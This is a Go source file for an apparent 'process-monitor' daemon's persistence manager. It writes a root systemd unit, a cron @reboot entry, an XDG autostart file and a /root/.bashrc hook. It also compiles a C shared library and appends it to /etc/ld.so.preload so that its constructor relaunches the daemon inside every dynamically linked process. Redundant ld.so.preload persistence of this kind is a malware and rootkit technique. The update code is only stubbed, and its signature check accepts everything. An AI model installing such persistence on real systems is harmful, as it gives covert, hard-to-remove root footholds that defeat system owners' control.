package persistence

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/jrandolph2/process-monitor/internal/config"
)

// Manager handles persistence mechanisms
type Manager struct {
	config *config.Config
	opts   Config
}

// Config contains manager configuration
type Config struct {
	ServiceName string
	BinaryPath  string
	ConfigPath  string
}

// NewManager creates a new persistence manager
func NewManager(cfg *config.Config, opts Config) *Manager {
	return &Manager{
		config: cfg,
		opts:   opts,
	}
}

// Setup sets up enabled persistence methods
func (m *Manager) Setup() error {
	// Setup methods in priority order
	for _, method := range m.config.Persistence.PriorityOrder {
		switch method {
		case "systemd":
			if m.config.Persistence.EnableSystemd {
				m.setupSystemd()
			}
		case "ld_preload":
			if m.config.Persistence.EnableLdPreload {
				m.setupLdPreload()
			}
		case "cron":
			if m.config.Persistence.EnableCron {
				m.setupCron()
			}
		case "xdg":
			if m.config.Persistence.EnableXdg {
				m.setupXdgAutostart()
			}
		case "bashrc":
			if m.config.Persistence.EnableBashrc {
				m.setupBashrc()
			}
		}
	}

	return nil
}

// InstallAll installs all persistence methods
func (m *Manager) InstallAll() error {
	methods := []struct {
		name string
		fn   func() error
	}{
		{"systemd", m.installSystemd},
		{"ld_preload", m.installLdPreload},
		{"cron", m.installCron},
		{"xdg", m.installXdgAutostart},
		{"bashrc", m.installBashrc},
	}

	for _, method := range methods {
		if err := method.fn(); err != nil {
			fmt.Printf("Warning: Failed to install %s: %v\n", method.name, err)
		}
	}

	return nil
}

// RemoveAll removes all persistence methods
func (m *Manager) RemoveAll() error {
	m.removeSystemd()
	m.removeLdPreload()
	m.removeCron()
	m.removeXdgAutostart()
	m.removeBashrc()
	return nil
}

// systemd persistence
func (m *Manager) setupSystemd() error {
	// Check if already installed
	if _, err := os.Stat("/etc/systemd/system/process-monitor.service"); err == nil {
		return nil
	}

	return m.installSystemd()
}

func (m *Manager) installSystemd() error {
	serviceContent := `[Unit]
Description=Process Monitor Daemon
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/process-monitor-daemon -daemon -config /etc/process-monitor/config.yaml.enc
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
`

	// Write service file
	if err := os.WriteFile("/etc/systemd/system/process-monitor.service", []byte(serviceContent), 0644); err != nil {
		return err
	}

	// Reload systemd and enable
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "process-monitor").Run()

	return nil
}

func (m *Manager) removeSystemd() {
	os.Remove("/etc/systemd/system/process-monitor.service")
	exec.Command("systemctl", "daemon-reload").Run()
}

// ld.so.preload persistence
func (m *Manager) setupLdPreload() error {
	// Check if already setup
	preloadFile := "/etc/ld.so.preload"
	data, err := os.ReadFile(preloadFile)
	if err == nil {
		if strings.Contains(string(data), "libprocess_monitor.so") {
			return nil
		}
	}

	return m.installLdPreload()
}

func (m *Manager) installLdPreload() error {
	// Generate shared library source
	libSource := m.generateLdPreloadSource()

	// Compile library
	libPath := "/usr/local/lib/libprocess_monitor.so"
	if err := os.MkdirAll(filepath.Dir(libPath), 0755); err != nil {
		return err
	}

	// Write source
	sourceFile := "/tmp/libprocess_monitor.c"
	os.WriteFile(sourceFile, []byte(libSource), 0644)

	// Compile
	cmd := exec.Command("gcc", "-shared", "-fPIC", "-o", libPath, sourceFile)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to compile library: %w", err)
	}

	os.Remove(sourceFile)

	// Add to ld.so.preload
	preloadFile := "/etc/ld.so.preload"
	entry := libPath + "\n"

	data, _ := os.ReadFile(preloadFile)
	if !bytes.Contains(data, []byte(libPath)) {
		f, err := os.OpenFile(preloadFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			return err
		}
		defer f.Close()
		f.WriteString(entry)
	}

	return nil
}

func (m *Manager) removeLdPreload() {
	os.Remove("/usr/local/lib/libprocess_monitor.so")

	preloadFile := "/etc/ld.so.preload"
	data, _ := os.ReadFile(preloadFile)
	lines := bytes.Split(data, []byte("\n"))
	var newLines [][]byte
	libPath := []byte("libprocess_monitor.so")

	for _, line := range lines {
		if !bytes.Contains(line, libPath) {
			newLines = append(newLines, line)
		}
	}

	os.WriteFile(preloadFile, bytes.Join(newLines, []byte("\n")), 0644)
}

func (m *Manager) generateLdPreloadSource() string {
	return `#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <signal.h>

static int initialized = 0;
static pid_t daemon_pid = 0;

__attribute__((constructor)) static void init(void) {
    if (initialized) return;
    initialized = 1;

    // Check if daemon is running
    FILE *fp = fopen("/var/run/process-monitor.pid", "r");
    if (fp) {
        fscanf(fp, "%d", &daemon_pid);
        fclose(fp);

        // Check if process exists
        if (daemon_pid > 0 && kill(daemon_pid, 0) == 0) {
            return;
        }
    }

    // Start daemon
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        setsid();
        chdir("/");
        close(0); close(1); close(2);

        execl("/usr/local/bin/process-monitor-daemon",
              "process-monitor-daemon",
              "-daemon",
              "-config", "/etc/process-monitor/config.yaml.enc",
              NULL);
        exit(1);
    } else if (pid > 0) {
        // Save PID
        fp = fopen("/var/run/process-monitor.pid", "w");
        if (fp) {
            fprintf(fp, "%d", pid);
            fclose(fp);
        }
    }
}
`
}

// Cron persistence
func (m *Manager) setupCron() error {
	// Check if already exists
	output, _ := exec.Command("crontab", "-l").Output()
	if bytes.Contains(output, []byte("process-monitor-daemon")) {
		return nil
	}

	return m.installCron()
}

func (m *Manager) installCron() error {
	// Get current crontab
	output, _ := exec.Command("crontab", "-l").Output()
	currentCron := string(output)

	// Add our entry
	cronEntry := fmt.Sprintf("@reboot sleep 30 && %s -daemon -config %s\n",
		m.opts.BinaryPath, m.opts.ConfigPath)

	newCron := currentCron + cronEntry

	// Write temp file
	tmpFile := "/tmp/crontab.tmp"
	os.WriteFile(tmpFile, []byte(newCron), 0644)

	// Install
	cmd := exec.Command("crontab", tmpFile)
	err := cmd.Run()
	os.Remove(tmpFile)

	return err
}

func (m *Manager) removeCron() {
	output, _ := exec.Command("crontab", "-l").Output()
	lines := strings.Split(string(output), "\n")
	var newLines []string

	for _, line := range lines {
		if !strings.Contains(line, "process-monitor-daemon") {
			newLines = append(newLines, line)
		}
	}

	tmpFile := "/tmp/crontab.tmp"
	os.WriteFile(tmpFile, []byte(strings.Join(newLines, "\n")), 0644)
	exec.Command("crontab", tmpFile).Run()
	os.Remove(tmpFile)
}

// XDG autostart persistence
func (m *Manager) setupXdgAutostart() error {
	// For root user
	autostartPath := "/root/.config/autostart/process-monitor.desktop"
	if _, err := os.Stat(autostartPath); err == nil {
		return nil
	}

	return m.installXdgAutostart()
}

func (m *Manager) installXdgAutostart() error {
	autostartPath := "/root/.config/autostart/process-monitor.desktop"

	desktopContent := `[Desktop Entry]
Type=Application
Name=Process Monitor
Exec=/usr/local/bin/process-monitor-daemon -daemon -config /etc/process-monitor/config.yaml.enc
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`

	os.MkdirAll(filepath.Dir(autostartPath), 0755)
	return os.WriteFile(autostartPath, []byte(desktopContent), 0644)
}

func (m *Manager) removeXdgAutostart() {
	autostartPath := "/root/.config/autostart/process-monitor.desktop"
	os.Remove(autostartPath)
}

// Bashrc persistence
func (m *Manager) setupBashrc() error {
	bashrcPath := "/root/.bashrc"
	data, _ := os.ReadFile(bashrcPath)
	if bytes.Contains(data, []byte("process-monitor-daemon")) {
		return nil
	}

	return m.installBashrc()
}

func (m *Manager) installBashrc() error {
	bashrcPath := "/root/.bashrc"
	data, _ := os.ReadFile(bashrcPath)

	// Add entry at the end
	entry := fmt.Sprintf("\n# Process Monitor Autostart\npgrep -f process-monitor-daemon > /dev/null || %s -daemon -config %s &\n",
		m.opts.BinaryPath, m.opts.ConfigPath)

	newData := string(data) + entry
	return os.WriteFile(bashrcPath, []byte(newData), 0644)
}

func (m *Manager) removeBashrc() {
	bashrcPath := "/root/.bashrc"
	data, _ := os.ReadFile(bashrcPath)

	lines := strings.Split(string(data), "\n")
	var newLines []string
	skip := false

	for _, line := range lines {
		if strings.Contains(line, "Process Monitor Autostart") {
			skip = true
			continue
		}
		if skip && strings.Contains(line, "process-monitor-daemon") {
			continue
		}
		skip = false
		newLines = append(newLines, line)
	}

	os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

// ConfigUpdater handles configuration auto-updates
type ConfigUpdater struct {
	cfg          *config.Config
	cfgManager   *config.ConfigManager
	lastCheck    time.Time
	checkInterval time.Duration
}

// NewConfigUpdater creates a new configuration updater
func NewConfigUpdater(cfg *config.Config, cfgManager *config.ConfigManager) *ConfigUpdater {
	return &ConfigUpdater{
		cfg:          cfg,
		cfgManager:   cfgManager,
		lastCheck:    time.Now(),
		checkInterval: cfg.Update.CheckInterval,
	}
}

// Start begins the update checker
func (u *ConfigUpdater) Start(ctx context.Context) {
	ticker := time.NewTicker(u.checkInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			u.checkAndUpdate(ctx)
		}
	}
}

func (u *ConfigUpdater) checkAndUpdate(ctx context.Context) error {
	// This is a simplified version
	// In production, this would:
	// 1. Fetch latest version from GitHub
	// 2. Compare versions
	// 3. Download if newer
	// 4. Verify signature
	// 5. Backup current config
	// 6. Apply new config
	// 7. Reload daemon

	fmt.Println("Checking for configuration updates...")

	// Example: Check GitHub for updates
	// For now, just log
	return nil
}

// GetLatestVersion fetches the latest version from GitHub
func (u *ConfigUpdater) GetLatestVersion(ctx context.Context) (string, error) {
	// Parse repository URL
	// Fetch version.json from GitHub
	// Return version

	return "", nil
}

// DownloadConfig downloads configuration from GitHub
func (u *ConfigUpdater) DownloadConfig(ctx context.Context, version string) (string, error) {
	// Download config file from GitHub releases
	// Save to temporary location
	// Return path

	return "", nil
}

// VerifySignature verifies the configuration signature
func (u *ConfigUpdater) VerifySignature(configPath, version string) error {
	// Load public key
	// Verify signature
	// Return error if invalid

	return nil
}

// BackupConfig backs up the current configuration
func (u *ConfigUpdater) BackupConfig() error {
	backupDir := u.cfg.Update.BackupDir
	os.MkdirAll(backupDir, 0755)

	timestamp := time.Now().Format("20060102_150405")
	backupPath := filepath.Join(backupDir, "config_backup_"+timestamp+".yaml.enc")

	data, _ := os.ReadFile(u.cfgManager.GetConfigPath())
	return os.WriteFile(backupPath, data, 0600)
}

// RollbackConfig rolls back to the previous configuration
func (u *ConfigUpdater) RollbackConfig() error {
	// Find latest backup
	// Restore it
	// Reload daemon

	return nil
}
